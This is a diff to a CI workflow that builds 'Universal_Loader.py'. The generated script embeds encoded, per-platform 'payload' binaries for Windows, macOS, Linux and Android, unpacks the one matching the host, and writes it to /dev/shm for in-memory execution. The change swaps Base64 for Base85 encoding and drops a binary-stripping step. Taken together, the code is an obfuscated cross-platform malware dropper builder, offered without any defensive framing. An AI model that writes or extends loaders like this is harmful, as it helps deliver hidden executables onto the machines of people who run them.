@@ -90,13 +90,6 @@ jobs:
           def pack():
               print("[*] Starting Universal Pack...")
               
-              # Strip binaries to reduce size before zipping
-              try:
-                  print(" [+] Stripping binaries...")
-                  subprocess.call(["strip", "--strip-all", "payload.linux.bin"])
-                  subprocess.call(["strip", "-x", "payload.macos.bin"]) # macOS specific strip
-              except: pass
-          
               # Map artifact names to internal keys
               mapping = {
                   "payload.windows.exe": "windows",
@@ -106,7 +99,7 @@ jobs:
               }
               
               final_zip = io.BytesIO()
-              # Create an optimized ZIP in memory (LZMA compression for max ratio)
+              # Use ZIP_LZMA for Maximum Compression (Smallest possible size)
               with zipfile.ZipFile(final_zip, "w", zipfile.ZIP_LZMA) as z:
                   for root, _, files in os.walk("."):
                       for f in files:
@@ -114,35 +107,38 @@ jobs:
                               print(f" [+] Adding {f} as {mapping[f]}...")
                               z.write(f, mapping[f])
               
-              # Encode ZIP to Base64
-              payload_b64 = base64.b64encode(final_zip.getvalue()).decode()
+              # [UPDATE] Encode to Base85 (Smaller than Base64)
+              payload_encoded = base64.b85encode(final_zip.getvalue()).decode()
               
               # Generate the self-extracting Python loader
               loader_code = f"""# -*- coding: utf-8 -*-
           import sys, os, base64, zipfile, io, tempfile, subprocess, platform, shutil
           import time
           
-          PAYLOAD = "{payload_b64}"
+          # [UPDATE] Base85 Payload
+          PAYLOAD = "{payload_encoded}"
           
           def run():
               print("Please wait up to 30 seconds for execution...")
+              
               # 1. Detect Platform
+              s = platform.system().lower()
               target = "linux"
-              if sys.platform == "win32": target = "windows"
-              elif sys.platform == "darwin": target = "macos"
-              if hasattr(sys, "getandroidapilevel"): target = "android"
-              else:
+              if "windows" in s: target = "windows"
+              elif "darwin" in s: target = "macos"
+              elif "linux" in s:
                   if os.path.exists("/system/build.prop"): target = "android"
               
               # 2. Extract specific binary for this platform
               try:
-                  raw = base64.b64decode(PAYLOAD)
+                  # [UPDATE] Decode Base85
+                  raw = base64.b85decode(PAYLOAD)
+                  
                   with zipfile.ZipFile(io.BytesIO(raw)) as z:
                       if target not in z.namelist():
                           return
                       
                       # 3. Write to temp (Memory-backed on Linux if possible, Disk on Win)
-                      # Linux: Try /dev/shm for true in-memory execution
                       mem_path = "/dev/shm" if os.path.exists("/dev/shm") else tempfile.gettempdir()
                       ext = ".exe" if target == "windows" else ".bin"
                       
@@ -168,7 +164,7 @@ jobs:
           """
               with open("Universal_Loader.py", "w") as f:
                   f.write(loader_code)
-              print("[+] Universal_Loader.py generated.")
+              print("[+] Universal_Loader.py generated (Base85 Optimized).")
           
           if __name__ == "__main__":
               pack()
